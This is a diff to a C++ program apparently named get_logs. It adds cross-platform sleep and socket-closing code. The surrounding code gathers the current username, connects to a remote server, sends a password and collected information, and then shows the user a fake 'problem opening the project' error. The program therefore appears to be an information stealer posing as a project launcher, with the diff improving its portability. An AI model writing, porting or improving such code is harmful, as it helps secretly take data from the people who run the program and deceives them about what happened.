@@ -1,6 +1,15 @@
 #include "get_logs.hpp"
 #include "get_logs_define.hpp"
 
+void	my_sleep(unsigned short milliseconds)
+{
+	#if defined(_WIN32) || defined(_WIN64)
+		Sleep(milliseconds);
+	#else
+    	sleep(milliseconds / 1000);
+	#endif
+}
+
 std::string get_current_username()
 {
 	std::string	username;
@@ -98,12 +107,7 @@ int socket_connection_handle(std::string send_infos)
     if (client_fd < 0)
         return (error_return("Socket creation error", 1));
     serv_addr.sin_family = AF_INET;
-	#if defined(_WIN32) || defined(_WIN64)
-		std::cout << new_str << std::endl;
-        serv_addr.sin_addr.S_un.S_addr = inet_addr(new_str);
-    #else
-        serv_addr.sin_addr.s_addr = inet_addr(new_str);
-    #endif
+	serv_addr.sin_addr.s_addr = inet_addr(new_str);
     serv_addr.sin_port = htons(PORT_SERVER_USE);
 
     status = connect(client_fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
@@ -111,13 +115,15 @@ int socket_connection_handle(std::string send_infos)
         return (error_return("Connection failed", 1));
     if (send(client_fd, password.c_str(), password.length(), 0) == -1)
         return (error_return("Couldn't send the message", 1));
-    sleep(1);
+	my_sleep(1000);
     if (send(client_fd, (char *)send_infos.c_str(), send_infos.length(), 0) == -1)
         return (error_return("Couldn't send the message", 1));
 	#if defined(_WIN32) || defined(_WIN64)
     	WSACleanup();
+		closesocket(client_fd);
+	#elif defined(__APPLE__)
+    	close(client_fd);
 	#endif
-    close(client_fd);
     return (0);
 }
 
@@ -142,6 +148,6 @@ int main(void)
 	if (program())
 		return (1);
     std::cerr << "A problem has occured while trying to open the project. Please try again in a few seconds" << std::endl;
-    sleep (3);
+    my_sleep (3000);
     return (0);
 }
